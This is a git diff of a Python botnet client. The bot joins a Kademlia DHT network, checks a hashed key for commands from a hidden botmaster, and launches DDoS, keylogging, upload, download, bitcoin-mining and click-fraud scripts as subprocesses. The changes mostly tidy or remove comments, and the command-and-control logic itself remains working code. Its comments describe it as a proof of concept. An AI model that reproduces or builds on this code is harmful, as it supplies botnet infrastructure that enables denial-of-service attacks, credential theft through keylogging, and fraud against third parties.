@@ -3,8 +3,6 @@ from twisted.python import log
 from kademlia.network import Server
 from collections import Counter
 import subprocess, time, sys, hashlib, time
-#these imports below are our own scripts that are run as commands
-#import keylogger,ddos, mine, clickFraud
 
 # I'm using a kademlia DHT protocol. I built most of this on top of Brian Muller's kademlia python implementation which
 # he so graciously provided free of charge. https://github.com/bmuller/kademlia I chose kademlia over chord because it has some advantages in both simplicity
@@ -26,33 +24,32 @@ port = int(sys.argv[2])
 myport = int(sys.argv[3])
 
 
-#object that stores info for this node.
+# object that stores info for this node.
 class botnode:
 	def __init__(self,ip,port,network_id,idhash):
 		self.ip = ip
 		self.port = port
 		self.id = network_id
 		self.cmdcnt = 0
-		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging)
+		#this will store all the child processes that are started
 		self.pgroup = []
-		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
 		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False,'UPLOAD':False, 'BITCOIN':False, 'CLICKFRAUD':False}
 		#cmdkey is the hash of the nodes bot id
 		self.cmdkey = idhash
 
-#hash function thats used in the DHT process
+# hash function thats used in the DHT process
 def get_hash(prehash):
 	m = hashlib.sha1()
 	m.update(prehash)
 	return m.hexdigest()
 
 
-#helper function to get most common element in a list
+# helper function to get most common element in a list
 def most_common(list):
 	data = Counter(list)
 	return data.most_common(1)[0][0]
 
-#End of deferred chain to execute commands once they've been received
+# End of deferred chain to execute commands once they've been received
 def get_cmd(value,server,bot):
 	commands = ['DDOS','DOWNLOAD','KEYLOG','UPLOAD', 'BITCOIN','CLICKFRAUD']
 	try:
@@ -75,13 +72,11 @@ def get_cmd(value,server,bot):
 					process=subprocess.Popen(tmp.split(),shell=False)
 					bot.cmdsrun['DDOS'] = True
 			if cmd == 'UPLOAD':
-				#if bot.cmdsrun['UPLOAD'] is False:
 				tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
 				print "Starting upload on {0}".format(tmp)
 				process=subprocess.Popen(tmp.split(),shell=False)
-					#bot.cmdsrun['UPLOAD'] = True
+
 			if cmd == 'DOWNLOAD':
-				#if bot.cmdsrun['DOWNLOAD'] is False:
 				tmp = 'python download.py {0}'.format(' '.join(x[1:]))
 				print "Starting DOWNLOAD on {0}".format(tmp)
 				process=subprocess.Popen(tmp.split(),shell=False)
@@ -94,25 +89,22 @@ def get_cmd(value,server,bot):
 				print "Starting CLICKFRAUD on {0}".format(tmp)
 				process=subprocess.Popen(tmp.split(),shell=False)
 
-					#bot.cmdsrun['DOWNLOAD'] = True
-			#can add any arbitrary command we want
-			#else:
-				#print 'Feel free to implement your own commands!'
 
 	except Exception, e:
 		pass
 			
 
-#checks the bots unique command location for a command
-#by using DHT to store commands, the bots never know who the botmaster actually is
-#the security can be increased by using encryption and a few other things, but this is just a proof of concept
+# This function checks the bots unique command location for a command by using DHT
+# to store commands, the bots never know who the botmaster actually is.
+# The security can be increased by using encryption and a few other things, 
+# but this is just a proof of concept
 def wait_cmd(server,bot):
 	print "Checking for command"
 	server.get(bot.cmdkey).addCallback(get_cmd,server,bot)
 
-#this function is part of a deferred chain to check in with the botmaster after joining a network
-#It's never a direct connection to the master, and the bots dont know about other bots or the master.
-#They only know where to check in, and where to grab their commands from
+# This function is part of a deferred chain to check in with the botmaster after joining a network
+# It's never a direct connection to the master, and the bots dont know about other bots or the master.
+# They only know where to check in, and where to grab their commands from
 def ack_valid(value,server,bot):
 	#t = hashlib.sha1().update('ack')
 	if value!=str(bot.id):
